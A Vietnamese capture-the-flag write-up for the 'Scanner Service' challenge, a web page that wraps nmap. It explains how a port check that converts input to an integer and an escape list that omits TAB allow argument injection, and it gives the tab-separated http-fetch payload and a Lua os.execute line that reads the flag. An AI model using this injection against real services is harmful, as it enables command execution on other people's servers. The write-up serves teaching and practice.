# **SENKAI CTF**

## **Scanner Service**

- Ở đây chúng ta có trang web có chức nmap địa chỉ ip với ip và port mình cung cấp 

![](./img_Senkai/Screenshot%202023-08-29%20153205.png)

- Chúng ta sẽ đi đọc source trang web để hiểu rõ hơn cách hoạt động cũng như phương thức chúng ta có thể tấn công

```Ruby
def valid_port?(input)
  !input.nil? and (1..65535).cover?(input.to_i)
end

def valid_ip?(input)
  pattern = /\A((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})\z/
  !input.nil? and !!(input =~ pattern)
end

# chatgpt code :-)
def escape_shell_input(input_string)
  escaped_string = ''
  input_string.each_char do |c|
    case c
    when ' '
      escaped_string << '\\ '
    when '$'
      escaped_string << '\\$'
    when '`'
      escaped_string << '\\`'
    when '"'
      escaped_string << '\\"'
    when '\\'
      escaped_string << '\\\\'
    when '|'
      escaped_string << '\\|'
    when '&'
      escaped_string << '\\&'
    when ';'
      escaped_string << '\\;'
    when '<'
      escaped_string << '\\<'
    when '>'
      escaped_string << '\\>'
    when '('
      escaped_string << '\\('
    when ')'
      escaped_string << '\\)'
    when "'"
      escaped_string << '\\\''
    when "\n"
      escaped_string << '\\n'
    when "*"
      escaped_string << '\\*'
    else
      escaped_string << c
    end
  end

  escaped_string
end

```

- Dường như ip và port đã được validate. Nhưng ta chú ý đến đoạn validate port như sau: 

- Trước hết, như chúng tôi đã đề cập trước đó, cổng đang được chuyển đổi thành số và chỉ sau đó mới được xác thực. Tuy nhiên, chúng ta thực sự có thể nhập bất kỳ thứ gì dưới dạng cổng, miễn là nó bắt đầu bằng một số, vì Ruby bỏ qua mọi thứ xuất hiện sau các chữ số đầu tiên.
![](./img_Senkai/Screenshot%202023-08-29%20154514.png)

- Thứ hai, danh sách đen chịu trách nhiệm thoát khỏi các ký tự dành riêng cho shell đang thiếu một ký tự quan trọng, đó là TAB. Các đối số không nhất thiết phải cách nhau bằng dấu cách, TAB cũng hoạt động.

- Thì tôi thực hiện khai thác trên port như sau:
```
80%09--script%09http-fetch%09--script-args%09http-fetch.destination=/tmp,http-fetch.url=rce-script

```

![](./img_Senkai/Screenshot%202023-08-29%20154631.png)


- Với file `rce-script` có nội dung `os.execute("cat /flag*")`

![](./img_Senkai/Screenshot%202023-08-29%20154805.png)